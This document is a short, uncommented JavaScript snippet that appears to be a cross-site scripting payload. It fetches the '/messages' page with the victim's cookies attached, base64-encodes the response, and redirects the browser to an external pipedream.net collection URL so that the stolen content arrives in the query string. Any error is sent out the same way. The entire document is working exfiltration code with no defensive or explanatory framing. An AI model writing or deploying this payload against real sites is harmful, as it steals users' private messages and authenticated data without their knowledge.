fetch("/messages", {
  method: "GET",
  credentials: "include"
})
  .then(r => {
    if (!r.ok) throw new Error("HTTP " + r.status);
    return r.text();
  })
  .then(txt => {
    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + btoa(txt);
  })
  .catch(err => {
    const encodedErr = btoa(String(err));
    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + encodedErr;
  });
